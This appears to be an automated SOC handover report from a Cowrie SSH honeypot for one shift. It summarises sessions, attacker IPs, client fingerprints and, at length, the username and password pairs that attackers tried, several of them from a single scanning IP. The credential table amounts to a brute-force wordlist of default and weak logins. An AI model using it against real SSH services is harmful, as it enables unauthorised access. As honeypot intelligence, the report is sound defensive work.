# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-20 |
| **Generated At** | 2026-08-20T22:33:19Z |
| **Shift Time** | 22:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **438** |
| Confirmed Threats | **410** |
| False Positives Filtered | **28** (6.4%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **25** |
| High Severity Cases | **355** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **3** HIGH · **21** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **371** |
| Unique Credential Pairs | **322** |
| Unique Usernames | **93** |
| Unique Passwords | **253** |
| Successful Auth Pairs | **354** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 116 |
| `centos` | 16 |
| `user` | 15 |
| `ubuntu` | 13 |
| `oracle` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 41 |
| `123` | 7 |
| `Host: 129.80.119.236:23` | 7 |
| `abc123` | 6 |
| `centos2009` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `centos` | `centos2009` | 5 |
| `user` | `user2021` | 5 |
| `centos` | `centos2015` | 5 |
| `user` | `user2019` | 5 |
| `centos` | `centos2005` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `Mehdi@123` | `217.60.255.130` | 2026-08-20T18:57:08 |
| `root` | `456123` | `217.60.255.130` | 2026-08-20T18:57:23 |
| `unknown` | `unknown2023` | `175.207.225.36` | 2026-08-20T19:08:11 |
| `unknown` | `unknown2023` | `219.129.236.174` | 2026-08-20T19:08:23 |
| `ubuntu` | `Mahdi123` | `217.60.255.130` | 2026-08-20T19:08:34 |
| `root` | `520520` | `217.60.255.130` | 2026-08-20T19:08:49 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.149.148` | 2026-08-20T19:15:28 |
| `centos` | `centos2009` | `175.43.162.214` | 2026-08-20T19:16:26 |
| `centos` | `centos2009` | `117.252.93.114` | 2026-08-20T19:16:40 |
| `centos` | `centos2005` | `185.112.148.66` | 2026-08-20T19:20:04 |
| `ubuntu` | `Hamed@123` | `217.60.255.130` | 2026-08-20T19:20:05 |
| `centos` | `centos2005` | `117.247.77.115` | 2026-08-20T19:20:10 |
| `centos` | `centos2005` | `178.132.144.161` | 2026-08-20T19:20:11 |
| `root` | `654321` | `217.60.255.130` | 2026-08-20T19:20:20 |
| `centos` | `centos2005` | `49.124.149.207` | 2026-08-20T19:20:22 |
| `user` | `user2021` | `10.0.0.73` | 2026-08-20T19:23:52 |
| `user` | `user2021` | `218.21.243.58` | 2026-08-20T19:25:27 |
| `user` | `user2021` | `185.40.122.250` | 2026-08-20T19:25:40 |
| `root` | `!Q2w3e4r` | `79.175.176.177` | 2026-08-20T19:26:10 |
| `hive` | `hive` | `79.175.176.177` | 2026-08-20T19:26:12 |
| `git` | `git` | `79.175.176.177` | 2026-08-20T19:26:12 |
| `pi` | `raspberry` | `79.175.176.177` | 2026-08-20T19:26:14 |
| `wang` | `wang123` | `79.175.176.177` | 2026-08-20T19:26:17 |
| `nginx` | `nginx` | `79.175.176.177` | 2026-08-20T19:26:17 |
| `mongo` | `123456` | `79.175.176.177` | 2026-08-20T19:26:19 |
| `root` | `aA123456` | `79.175.176.177` | 2026-08-20T19:26:22 |
| `gitlab` | `gitlab` | `79.175.176.177` | 2026-08-20T19:26:23 |
| `esroot` | `esroot` | `79.175.176.177` | 2026-08-20T19:26:23 |
| `root` | `!qaz@WSX` | `79.175.176.177` | 2026-08-20T19:26:24 |
| `root` | `P@ssw0rd` | `79.175.176.177` | 2026-08-20T19:26:25 |
| `user` | `user` | `79.175.176.177` | 2026-08-20T19:26:25 |
| `lighthouse` | `123456` | `79.175.176.177` | 2026-08-20T19:26:26 |
| `gpadmin` | `gpadmin123` | `79.175.176.177` | 2026-08-20T19:26:26 |
| `oracle` | `!QAZ@WSX` | `79.175.176.177` | 2026-08-20T19:26:26 |
| `oracle` | `oracle` | `79.175.176.177` | 2026-08-20T19:26:28 |
| `user1` | `user1` | `79.175.176.177` | 2026-08-20T19:26:28 |
| `flask` | `12345678` | `79.175.176.177` | 2026-08-20T19:26:28 |
| `test` | `1234qwer` | `79.175.176.177` | 2026-08-20T19:26:29 |
| `apache` | `apache123` | `79.175.176.177` | 2026-08-20T19:26:29 |
| `root` | `Aa123456` | `79.175.176.177` | 2026-08-20T19:26:33 |
| `root` | `abc123` | `79.175.176.177` | 2026-08-20T19:26:34 |
| `user1` | `123456` | `79.175.176.177` | 2026-08-20T19:26:35 |
| `root` | `p@ssword` | `79.175.176.177` | 2026-08-20T19:26:35 |
| `tom` | `123456` | `79.175.176.177` | 2026-08-20T19:26:37 |
| `mysql` | `123456` | `79.175.176.177` | 2026-08-20T19:26:37 |
| `root` | `P@ssword` | `79.175.176.177` | 2026-08-20T19:26:38 |
| `oscar` | `oscar123` | `79.175.176.177` | 2026-08-20T19:26:38 |
| `flink` | `flink` | `79.175.176.177` | 2026-08-20T19:26:38 |
| `user` | `111111` | `79.175.176.177` | 2026-08-20T19:26:38 |
| `root` | `qQ123456` | `79.175.176.177` | 2026-08-20T19:26:40 |
| `root` | `Ab123456` | `79.175.176.177` | 2026-08-20T19:26:40 |
| `developer` | `123456` | `79.175.176.177` | 2026-08-20T19:26:42 |
| `esuser` | `123456` | `79.175.176.177` | 2026-08-20T19:26:43 |
| `root` | `1qaz@wsx` | `79.175.176.177` | 2026-08-20T19:26:43 |
| `hadoop` | `hadoop` | `79.175.176.177` | 2026-08-20T19:26:45 |
| `root` | `4r3e2w1q` | `79.175.176.177` | 2026-08-20T19:26:46 |
| `postgres` | `123` | `79.175.176.177` | 2026-08-20T19:26:49 |
| `root` | `admin` | `79.175.176.177` | 2026-08-20T19:26:49 |
| `dolphinscheduler` | `123456` | `79.175.176.177` | 2026-08-20T19:26:49 |
| `app` | `app123` | `79.175.176.177` | 2026-08-20T19:26:49 |
| `mysql` | `mysql123` | `79.175.176.177` | 2026-08-20T19:26:52 |
| `root` | `1` | `79.175.176.177` | 2026-08-20T19:26:53 |
| `oracle` | `qwe123` | `79.175.176.177` | 2026-08-20T19:26:54 |
| `lighthouse` | `lighthouse123` | `79.175.176.177` | 2026-08-20T19:26:54 |
| `apache` | `apache` | `79.175.176.177` | 2026-08-20T19:26:54 |
| `git` | `123456` | `79.175.176.177` | 2026-08-20T19:26:55 |
| `sonar` | `sonar123` | `79.175.176.177` | 2026-08-20T19:26:55 |
| `tools` | `tools` | `79.175.176.177` | 2026-08-20T19:26:56 |
| `root` | `1Q2w3e4r` | `79.175.176.177` | 2026-08-20T19:26:57 |
| `admin` | `123456` | `79.175.176.177` | 2026-08-20T19:26:57 |
| `root` | `password` | `79.175.176.177` | 2026-08-20T19:26:57 |
| `test` | `abc123` | `79.175.176.177` | 2026-08-20T19:26:57 |
| `svnuser` | `123456` | `79.175.176.177` | 2026-08-20T19:26:57 |
| `app` | `app123456` | `79.175.176.177` | 2026-08-20T19:27:00 |
| `elastic` | `elastic123` | `79.175.176.177` | 2026-08-20T19:27:00 |
| `www` | `abc123` | `79.175.176.177` | 2026-08-20T19:27:01 |
| `oscar` | `oscar` | `79.175.176.177` | 2026-08-20T19:27:02 |
| `guest` | `abc123` | `79.175.176.177` | 2026-08-20T19:27:02 |
| `plexserver` | `plexserver` | `79.175.176.177` | 2026-08-20T19:27:02 |
| `sonar` | `123456` | `79.175.176.177` | 2026-08-20T19:27:02 |
| `root` | `qwerty123` | `79.175.176.177` | 2026-08-20T19:27:05 |
| `root` | `p@ssw0rd` | `79.175.176.177` | 2026-08-20T19:27:08 |
| `gpadmin` | `gpadmin` | `79.175.176.177` | 2026-08-20T19:27:10 |
| `git` | `git123` | `79.175.176.177` | 2026-08-20T19:27:11 |
| `jumpserver` | `jumpserver` | `79.175.176.177` | 2026-08-20T19:27:11 |
| `tom` | `tom123` | `79.175.176.177` | 2026-08-20T19:27:11 |
| `root` | `1234` | `79.175.176.177` | 2026-08-20T19:27:11 |
| `elsearch` | `elsearch` | `79.175.176.177` | 2026-08-20T19:27:12 |
| `ubuntu` | `ubuntu` | `79.175.176.177` | 2026-08-20T19:27:12 |
| `tom` | `tom` | `79.175.176.177` | 2026-08-20T19:27:13 |
| `root` | `1Q2W3E4R` | `79.175.176.177` | 2026-08-20T19:27:13 |
| `appuser` | `appuser` | `79.175.176.177` | 2026-08-20T19:27:14 |
| `nginx` | `123456` | `79.175.176.177` | 2026-08-20T19:27:15 |
| `rancher` | `rancher` | `79.175.176.177` | 2026-08-20T19:27:15 |
| `rancher` | `rancher123` | `79.175.176.177` | 2026-08-20T19:27:15 |
| `root` | `Pa$$w0rd` | `79.175.176.177` | 2026-08-20T19:27:15 |
| `root` | `1qaz2wsx` | `79.175.176.177` | 2026-08-20T19:27:19 |
| `root` | `Qq123456` | `79.175.176.177` | 2026-08-20T19:27:19 |
| `user` | `123` | `79.175.176.177` | 2026-08-20T19:27:20 |
| `uftp` | `uftp123` | `79.175.176.177` | 2026-08-20T19:27:23 |
| `data` | `data` | `79.175.176.177` | 2026-08-20T19:27:24 |
| `bigdata` | `bigdata` | `79.175.176.177` | 2026-08-20T19:27:24 |
| `esuser` | `esuser` | `79.175.176.177` | 2026-08-20T19:27:24 |
| `user` | `1` | `79.175.176.177` | 2026-08-20T19:27:25 |
| `docker` | `docker` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `plex` | `plex` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `oracle` | `!QAZ@wsx` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `nginx` | `nginx123` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `root` | `passw0rd` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `test` | `test` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `steam` | `123456` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `postgres` | `postgres123` | `79.175.176.177` | 2026-08-20T19:27:28 |
| `ts` | `ts` | `79.175.176.177` | 2026-08-20T19:27:31 |
| `gitlab` | `123456` | `79.175.176.177` | 2026-08-20T19:27:32 |
| `elastic` | `elastic` | `79.175.176.177` | 2026-08-20T19:27:34 |
| `observer` | `observer` | `79.175.176.177` | 2026-08-20T19:27:34 |
| `gpuadmin` | `gpuadmin` | `79.175.176.177` | 2026-08-20T19:27:35 |
| `oracle` | `password` | `79.175.176.177` | 2026-08-20T19:27:37 |
| `flask` | `flask` | `79.175.176.177` | 2026-08-20T19:27:38 |
| `guest` | `guest` | `79.175.176.177` | 2026-08-20T19:27:38 |
| `ftpuser` | `abc123` | `79.175.176.177` | 2026-08-20T19:27:38 |
| `root` | `4e2q1w3r` | `79.175.176.177` | 2026-08-20T19:27:41 |
| `flask` | `flask123` | `79.175.176.177` | 2026-08-20T19:27:41 |
| `gitlab` | `12345678` | `79.175.176.177` | 2026-08-20T19:27:41 |
| `zabbix` | `123456` | `79.175.176.177` | 2026-08-20T19:27:42 |
| `testuser` | `testuser` | `79.175.176.177` | 2026-08-20T19:27:43 |
| `postgres` | `postgres` | `79.175.176.177` | 2026-08-20T19:27:46 |
| `admin` | `admin123` | `79.175.176.177` | 2026-08-20T19:27:46 |
| `test` | `test123` | `79.175.176.177` | 2026-08-20T19:27:47 |
| `jenkins` | `jenkins` | `79.175.176.177` | 2026-08-20T19:27:48 |
| `steam` | `steam` | `79.175.176.177` | 2026-08-20T19:27:49 |
| `root` | `Qwerty` | `79.175.176.177` | 2026-08-20T19:27:49 |
| `mysql` | `mysql` | `79.175.176.177` | 2026-08-20T19:27:50 |
| `test` | `123456` | `79.175.176.177` | 2026-08-20T19:27:50 |
| `centos` | `123456` | `79.175.176.177` | 2026-08-20T19:27:51 |
| `worker` | `worker` | `79.175.176.177` | 2026-08-20T19:27:51 |
| `kubernetes` | `kubernetes` | `79.175.176.177` | 2026-08-20T19:27:53 |
| `bot` | `bot` | `79.175.176.177` | 2026-08-20T19:27:53 |
| `centos` | `centos` | `79.175.176.177` | 2026-08-20T19:27:54 |
| `root` | `!Q@W3e4r` | `79.175.176.177` | 2026-08-20T19:27:54 |
| `elastic` | `123456` | `79.175.176.177` | 2026-08-20T19:27:54 |
| `ranger` | `ranger` | `79.175.176.177` | 2026-08-20T19:27:55 |
| `zabbix` | `zabbix` | `79.175.176.177` | 2026-08-20T19:27:55 |
| `debianuser` | `1qazXSW@` | `79.175.176.177` | 2026-08-20T19:27:55 |
| `root` | `root123` | `79.175.176.177` | 2026-08-20T19:27:55 |
| `tomcat` | `tomcat123` | `79.175.176.177` | 2026-08-20T19:27:56 |
| `centos` | `centos2009` | `10.0.0.73` | 2026-08-20T19:27:57 |
| `tomcat` | `tomcat` | `79.175.176.177` | 2026-08-20T19:27:58 |
| `weblogic` | `weblogic` | `79.175.176.177` | 2026-08-20T19:27:59 |
| `observer` | `observer123` | `79.175.176.177` | 2026-08-20T19:28:00 |
| `root` | `P@55w0rd` | `79.175.176.177` | 2026-08-20T19:28:00 |
| `hadoop` | `123` | `79.175.176.177` | 2026-08-20T19:28:00 |
| `root` | `!QAZ2wsx` | `79.175.176.177` | 2026-08-20T19:28:01 |
| `gitlab` | `gitlab123` | `79.175.176.177` | 2026-08-20T19:28:02 |
| `oracle` | `abc123` | `79.175.176.177` | 2026-08-20T19:28:03 |
| `ftp` | `ftp123` | `79.175.176.177` | 2026-08-20T19:28:03 |
| `tools` | `tools123` | `79.175.176.177` | 2026-08-20T19:28:04 |
| `admin` | `admin` | `79.175.176.177` | 2026-08-20T19:28:04 |
| `admin` | `1234` | `79.175.176.177` | 2026-08-20T19:28:04 |
| `root` | `!Qaz@Wsx` | `79.175.176.177` | 2026-08-20T19:28:04 |
| `root` | `1234567890` | `79.175.176.177` | 2026-08-20T19:28:04 |
| `www` | `www` | `79.175.176.177` | 2026-08-20T19:28:06 |
| `es` | `123` | `79.175.176.177` | 2026-08-20T19:28:07 |
| `root` | `QWERTY123` | `79.175.176.177` | 2026-08-20T19:28:08 |
| `flink` | `flink123` | `79.175.176.177` | 2026-08-20T19:28:08 |
| `root` | `12345` | `79.175.176.177` | 2026-08-20T19:28:09 |
| `default` | `1` | `79.175.176.177` | 2026-08-20T19:28:09 |
| `oracle` | `1qaz@WSX` | `79.175.176.177` | 2026-08-20T19:28:09 |
| `oracle` | `123456` | `79.175.176.177` | 2026-08-20T19:28:10 |
| `nvidia` | `nvidia123` | `79.175.176.177` | 2026-08-20T19:28:10 |
| `es` | `es123456` | `79.175.176.177` | 2026-08-20T19:28:13 |
| `ubnt` | `ubnt` | `79.175.176.177` | 2026-08-20T19:28:14 |
| `app` | `123456` | `79.175.176.177` | 2026-08-20T19:28:20 |
| `root` | `AA123456` | `79.175.176.177` | 2026-08-20T19:28:21 |
| `mongodb` | `123456` | `79.175.176.177` | 2026-08-20T19:28:22 |
| `root` | `!QAZ@WSX` | `79.175.176.177` | 2026-08-20T19:28:22 |
| `root` | `Passw0rd` | `79.175.176.177` | 2026-08-20T19:28:23 |
| `root` | `Password1` | `79.175.176.177` | 2026-08-20T19:28:23 |
| `gitlab-runner` | `gitlab-runner` | `79.175.176.177` | 2026-08-20T19:28:24 |
| `root` | `Password` | `79.175.176.177` | 2026-08-20T19:28:26 |
| `mongodb` | `mongodb` | `79.175.176.177` | 2026-08-20T19:28:26 |
| `hadoop` | `123456` | `79.175.176.177` | 2026-08-20T19:28:27 |
| `elasticsearch` | `elasticsearch` | `79.175.176.177` | 2026-08-20T19:28:27 |
| `elsearch` | `123456` | `79.175.176.177` | 2026-08-20T19:28:27 |
| `steam` | `steam123` | `79.175.176.177` | 2026-08-20T19:28:27 |
| `dev` | `dev123456` | `79.175.176.177` | 2026-08-20T19:28:27 |
| `root` | `123321` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `sonar` | `sonar` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `ftp` | `123456` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `esuser` | `123` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `developer` | `developer` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `git` | `123` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `root` | `123` | `79.175.176.177` | 2026-08-20T19:28:28 |
| `postgres` | `123456` | `79.175.176.177` | 2026-08-20T19:28:30 |
| `www` | `123456` | `79.175.176.177` | 2026-08-20T19:28:30 |
| `ftpuser` | `ftpuser` | `79.175.176.177` | 2026-08-20T19:28:31 |
| `guest` | `guest123` | `79.175.176.177` | 2026-08-20T19:28:31 |
| `tomcat` | `123456` | `79.175.176.177` | 2026-08-20T19:28:32 |
| `docker` | `docker123` | `79.175.176.177` | 2026-08-20T19:28:40 |
| `esuser` | `esuser123` | `79.175.176.177` | 2026-08-20T19:28:40 |
| `ftpuser` | `ftpuser123` | `79.175.176.177` | 2026-08-20T19:28:40 |
| `dev` | `123456` | `79.175.176.177` | 2026-08-20T19:28:41 |
| `root` | `1qaz@WSX` | `79.175.176.177` | 2026-08-20T19:28:42 |
| `admin` | `password` | `79.175.176.177` | 2026-08-20T19:28:42 |
| `vagrant` | `vagrant` | `79.175.176.177` | 2026-08-20T19:28:44 |
| `es` | `es` | `79.175.176.177` | 2026-08-20T19:28:44 |
| `lighthouse` | `lighthouse` | `79.175.176.177` | 2026-08-20T19:28:46 |
| `demo` | `demo` | `79.175.176.177` | 2026-08-20T19:28:47 |
| `uftp` | `uftp` | `79.175.176.177` | 2026-08-20T19:28:47 |
| `esadmin` | `esadmin` | `79.175.176.177` | 2026-08-20T19:28:48 |
| `deploy` | `deploy` | `79.175.176.177` | 2026-08-20T19:28:48 |
| `root` | `QQ123456` | `79.175.176.177` | 2026-08-20T19:28:52 |
| `user` | `123456` | `79.175.176.177` | 2026-08-20T19:28:52 |
| `rabbitmq` | `rabbitmq` | `79.175.176.177` | 2026-08-20T19:28:54 |
| `ubuntu` | `123456` | `79.175.176.177` | 2026-08-20T19:28:54 |
| `ftpuser` | `123456` | `79.175.176.177` | 2026-08-20T19:28:54 |
| `svnuser` | `svnuser` | `79.175.176.177` | 2026-08-20T19:28:54 |
| `root` | `a123456A` | `79.175.176.177` | 2026-08-20T19:28:55 |
| `deploy` | `123456` | `79.175.176.177` | 2026-08-20T19:28:55 |
| `oceanbase` | `oceanbase` | `79.175.176.177` | 2026-08-20T19:28:56 |
| `flask` | `123456` | `79.175.176.177` | 2026-08-20T19:28:56 |
| `root` | `1qazxsw2` | `79.175.176.177` | 2026-08-20T19:28:57 |
| `root` | `Admin@123` | `79.175.176.177` | 2026-08-20T19:28:57 |
| `root` | `root@123` | `79.175.176.177` | 2026-08-20T19:28:57 |
| `deploy` | `deploy123` | `79.175.176.177` | 2026-08-20T19:28:59 |
| `pi` | `pi` | `79.175.176.177` | 2026-08-20T19:28:59 |
| `root` | `aa123456` | `79.175.176.177` | 2026-08-20T19:28:59 |
| `root` | `toor` | `79.175.176.177` | 2026-08-20T19:28:59 |
| `root` | `aB123456` | `79.175.176.177` | 2026-08-20T19:28:59 |
| `root` | `1qazXSW@` | `79.175.176.177` | 2026-08-20T19:29:00 |
| `dolphinscheduler` | `dolphinscheduler` | `79.175.176.177` | 2026-08-20T19:29:00 |
| `root` | `111111` | `79.175.176.177` | 2026-08-20T19:29:00 |
| `wang` | `123456` | `79.175.176.177` | 2026-08-20T19:29:02 |
| `elasticsearch` | `123456` | `79.175.176.177` | 2026-08-20T19:29:03 |
| `root` | `qwerty` | `79.175.176.177` | 2026-08-20T19:29:04 |
| `awsgui` | `awsgui` | `79.175.176.177` | 2026-08-20T19:29:04 |
| `root` | `passwd` | `79.175.176.177` | 2026-08-20T19:29:05 |
| `ftp` | `ftp` | `79.175.176.177` | 2026-08-20T19:29:05 |
| `dev` | `dev` | `79.175.176.177` | 2026-08-20T19:29:06 |
| `test2` | `test2` | `79.175.176.177` | 2026-08-20T19:29:06 |
| `hadoop` | `hadoop123` | `79.175.176.177` | 2026-08-20T19:29:07 |
| `oracle` | `123qwe` | `79.175.176.177` | 2026-08-20T19:29:08 |
| `oscar` | `123456` | `79.175.176.177` | 2026-08-20T19:29:11 |
| `uftp` | `123456` | `79.175.176.177` | 2026-08-20T19:29:13 |
| `yarn` | `yarn` | `79.175.176.177` | 2026-08-20T19:29:14 |
| `guest` | `123456` | `79.175.176.177` | 2026-08-20T19:29:14 |
| `dolphinscheduler` | `dolphinscheduler123` | `79.175.176.177` | 2026-08-20T19:29:15 |
| `root` | `A123456a` | `79.175.176.177` | 2026-08-20T19:29:16 |
| `oracle` | `oracle123` | `79.175.176.177` | 2026-08-20T19:29:16 |
| `root` | `Ac123456` | `79.175.176.177` | 2026-08-20T19:29:18 |
| `nvidia` | `nvidia` | `79.175.176.177` | 2026-08-20T19:29:19 |
| `nexus` | `nexus` | `79.175.176.177` | 2026-08-20T19:29:20 |
| `root` | `qq123456` | `79.175.176.177` | 2026-08-20T19:29:21 |
| `www` | `www123` | `79.175.176.177` | 2026-08-20T19:29:21 |
| `worker` | `worker123` | `79.175.176.177` | 2026-08-20T19:29:21 |
| `root` | `1q2w3e4r` | `79.175.176.177` | 2026-08-20T19:29:26 |
| `wang` | `wang` | `79.175.176.177` | 2026-08-20T19:29:26 |
| `app` | `app` | `79.175.176.177` | 2026-08-20T19:29:27 |
| `sugi` | `sugi` | `79.175.176.177` | 2026-08-20T19:29:28 |
| `es` | `es123` | `79.175.176.177` | 2026-08-20T19:29:29 |
| `root` | `123456789` | `79.175.176.177` | 2026-08-20T19:29:30 |
| `root` | `rootroot` | `79.175.176.177` | 2026-08-20T19:29:30 |
| `ubuntu` | `Vahid@123` | `217.60.255.130` | 2026-08-20T19:31:49 |
| `root` | `987654` | `217.60.255.130` | 2026-08-20T19:32:01 |
| `support` | `support` | `176.53.159.196` | 2026-08-20T19:34:17 |
| `root` | `Lai123456` | `186.96.158.180` | 2026-08-20T19:40:16 |
| `345gs5662d34` | `345gs5662d34` | `186.96.158.180` | 2026-08-20T19:40:19 |
| `root` | `3245gs5662d34` | `186.96.158.180` | 2026-08-20T19:40:20 |
| `jeff` | `jeff1` | `104.243.42.167` | 2026-08-20T19:40:59 |
| `345gs5662d34` | `345gs5662d34` | `104.243.42.167` | 2026-08-20T19:41:01 |
| `jeff` | `3245gs5662d34` | `104.243.42.167` | 2026-08-20T19:41:01 |
| `user` | `user2021` | `101.13.5.50` | 2026-08-20T19:41:09 |
| `user` | `user2021` | `202.72.196.75` | 2026-08-20T19:41:18 |
| `ubuntu` | `Nasser@123` | `217.60.255.130` | 2026-08-20T19:43:13 |
| `root` | `1020304` | `217.60.255.130` | 2026-08-20T19:43:24 |
| `GET / HTTP/1.0` | `` | `138.68.101.246` | 2026-08-20T19:44:17 |
| `OPTIONS / HTTP/1.0` | `` | `138.68.101.246` | 2026-08-20T19:44:22 |
| `root` | `princess` | `217.60.240.161` | 2026-08-20T19:44:23 |
| `root` | `master` | `217.60.240.161` | 2026-08-20T19:44:24 |
| `root` | `hello` | `217.60.240.161` | 2026-08-20T19:44:26 |
| `centos` | `centos2009` | `117.253.130.123` | 2026-08-20T19:44:26 |
| `root` | `charlie` | `217.60.240.161` | 2026-08-20T19:44:27 |
| `OPTIONS / RTSP/1.0` | `` | `138.68.101.246` | 2026-08-20T19:44:27 |
| `root` | `888888` | `217.60.240.161` | 2026-08-20T19:44:29 |
| `root` | `22` | `217.60.240.161` | 2026-08-20T19:44:30 |
| `root` | `superman` | `217.60.240.161` | 2026-08-20T19:44:32 |
| `root` | `michael` | `217.60.240.161` | 2026-08-20T19:44:33 |
| `root` | `696969` | `217.60.240.161` | 2026-08-20T19:44:36 |
| `root` | `qwertyuiop` | `217.60.240.161` | 2026-08-20T19:44:38 |
| `root` | `hottie` | `217.60.240.161` | 2026-08-20T19:44:39 |
| `root` | `freedom` | `217.60.240.161` | 2026-08-20T19:44:41 |
| `root` | `aa123456` | `217.60.240.161` | 2026-08-20T19:44:42 |
| `root` | `23` | `217.60.240.161` | 2026-08-20T19:44:50 |
| `root` | `qazwsx` | `217.60.240.161` | 2026-08-20T19:44:51 |
| `root` | `ninja` | `217.60.240.161` | 2026-08-20T19:44:53 |
| `root` | `azerty` | `217.60.240.161` | 2026-08-20T19:44:54 |
| `root` | `123123` | `217.60.240.161` | 2026-08-20T19:44:55 |
| `root` | `solo` | `217.60.240.161` | 2026-08-20T19:44:57 |
| `root` | `whatever` | `217.60.240.161` | 2026-08-20T19:45:03 |
| `root` | `donald` | `217.60.240.161` | 2026-08-20T19:45:04 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `138.68.101.246` | 2026-08-20T19:45:05 |
| `root` | `dragon` | `217.60.240.161` | 2026-08-20T19:45:06 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `207.154.233.124` | 2026-08-20T19:45:13 |
| `GET /solr/admin/info/system HTTP/1.1` | `Host: 129.80.119.236:23` | `167.99.243.59` | 2026-08-20T19:45:14 |
| `GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1` | `Host: 129.80.119.236:23` | `167.99.243.59` | 2026-08-20T19:45:16 |
| `blank` | `blank2005` | `41.220.3.101` | 2026-08-20T19:49:37 |
| `root` | `debian` | `222.211.75.201` | 2026-08-20T19:49:41 |
| `blank` | `blank2005` | `61.184.128.210` | 2026-08-20T19:49:46 |
| `test` | `test2006` | `49.124.159.194` | 2026-08-20T19:52:57 |
| `test` | `test2006` | `223.99.212.58` | 2026-08-20T19:53:07 |
| `test` | `test2006` | `202.72.196.75` | 2026-08-20T19:53:14 |
| `test` | `test2006` | `59.93.36.136` | 2026-08-20T19:53:24 |
| `ubuntu` | `qazwsx!@#` | `217.60.255.130` | 2026-08-20T19:54:40 |
| `root` | `1234560` | `217.60.255.130` | 2026-08-20T19:54:53 |
| `root` | `123qwerty` | `2.57.122.209` | 2026-08-20T19:55:51 |
| `root` | `root2000` | `10.0.0.73` | 2026-08-20T19:56:59 |
| `root` | `21` | `2.57.122.209` | 2026-08-20T19:58:48 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-20T19:58:53 |
| `support` | `support` | `10.0.0.73` | 2026-08-20T19:59:01 |
| `root` | `321` | `2.57.122.209` | 2026-08-20T20:01:45 |
| `root` | `4321` | `2.57.122.209` | 2026-08-20T20:04:39 |
| `ubuntu` | `user` | `217.60.255.130` | 2026-08-20T20:06:17 |
| `root` | `1234566` | `217.60.255.130` | 2026-08-20T20:06:27 |
| `root` | `54321` | `2.57.122.209` | 2026-08-20T20:07:39 |
| `root` | `P4ssw0rd` | `2.57.122.209` | 2026-08-20T20:10:41 |
| `root` | `P4ssword` | `2.57.122.209` | 2026-08-20T20:13:38 |
| `root` | `root2000` | `223.99.212.58` | 2026-08-20T20:14:20 |
| `root` | `root2000` | `116.114.94.242` | 2026-08-20T20:14:30 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-08-20T20:16:43 |
| `blank` | `blank2005` | `223.107.72.234` | 2026-08-20T20:17:40 |
| `ubuntu` | `Qwerty1234` | `217.60.255.130` | 2026-08-20T20:17:46 |
| `blank` | `blank2005` | `111.171.125.94` | 2026-08-20T20:17:50 |
| `root` | `1234567` | `217.60.255.130` | 2026-08-20T20:17:57 |
| `root` | `Passw0rd` | `2.57.122.209` | 2026-08-20T20:20:08 |
| `centos` | `centos2015` | `177.174.0.3` | 2026-08-20T20:22:50 |
| `support` | `support2009` | `117.158.166.73` | 2026-08-20T20:25:59 |
| `support` | `support2009` | `117.250.19.91` | 2026-08-20T20:26:10 |
| `support` | `support2009` | `50.188.204.213` | 2026-08-20T20:26:16 |
| `support` | `support2009` | `60.249.251.88` | 2026-08-20T20:26:26 |
| `ubuntu` | `123qwe` | `217.60.255.130` | 2026-08-20T20:29:10 |
| `root` | `1598753` | `217.60.255.130` | 2026-08-20T20:29:21 |
| `user` | `user2019` | `10.0.0.73` | 2026-08-20T20:30:01 |
| `user` | `user2019` | `24.142.170.231` | 2026-08-20T20:31:39 |
| `user` | `user2019` | `196.216.81.126` | 2026-08-20T20:31:47 |
| `centos` | `centos2015` | `10.0.0.73` | 2026-08-20T20:33:55 |
| `ubuntu` | `free` | `217.60.255.130` | 2026-08-20T20:40:34 |
| `root` | `7777777` | `217.60.255.130` | 2026-08-20T20:40:45 |
| `ubnt` | `ubnt2015` | `10.0.0.73` | 2026-08-20T20:41:07 |
| `user` | `user2019` | `61.84.4.230` | 2026-08-20T20:47:21 |
| `centos` | `centos2015` | `124.160.45.26` | 2026-08-20T20:50:52 |
| `root` | `admin` | `192.42.116.17` | 2026-08-20T20:50:52 |
| `centos` | `centos2015` | `113.11.34.221` | 2026-08-20T20:51:04 |
| `ubuntu` | `q1w2e3r4T5` | `217.60.255.130` | 2026-08-20T20:52:08 |
| `root` | `7895123` | `217.60.255.130` | 2026-08-20T20:52:17 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **438** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 285 |
| libssh | 37 |
| OpenSSH | 35 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
